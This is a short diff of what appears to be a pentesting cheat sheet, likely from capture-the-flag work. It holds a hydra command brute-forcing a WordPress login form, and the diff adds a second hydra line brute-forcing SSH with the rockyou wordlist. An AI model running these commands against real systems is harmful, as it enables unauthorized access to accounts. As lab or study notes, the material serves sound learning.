@@ -107,4 +107,6 @@ Network brute force login cracker
 
 ```
 hydra -l Elliot -P fsocity.dic 10.10.103.0 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.103.0%2Fwp-admin%2F&testcookie=1:F=is incorrect'
+
+hydra -l jan -P rockyou.txt ssh://1.2.3.4
 ```
